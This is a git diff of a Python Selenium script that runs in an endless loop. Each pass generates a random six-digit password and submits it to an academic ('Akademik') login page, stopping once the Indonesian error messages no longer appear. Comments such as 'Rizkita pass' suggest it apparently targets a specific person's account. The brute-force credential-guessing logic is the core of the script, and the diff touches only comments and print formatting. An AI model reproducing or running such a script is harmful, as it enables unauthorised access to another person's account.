@@ -26,13 +26,12 @@ def generate():
     return '{:06d}'.format(randint(0,999999))
 
 if __name__ == '__main__':
-
+    # chromedriver path
     driverpath = '/home/irfancr/Practices/rizkitawar/chromedriver'
     # initialize the Chrome driver
     driver = webdriver.Chrome(driverpath)
     error_message = ["Maaf, Password salah.", "Maaf, status Username tidak aktif."]
-    # passwords = ['123456', '5542313', '772359', '0321321']
-
+    
     while(True):
         # Akademik credentials
         # Rizkita pass
@@ -46,10 +45,9 @@ if __name__ == '__main__':
         print("{}: {}".format(username, password))
 
         if any(e.text in error_message for e in errors):
-            print("[!] Login failed")
+            print("[!] Login failed", end='\n\n')
         else:
             print("[+] Login successful")
             break
-        # close the driver
-
+    # close the driver
     driver.close()
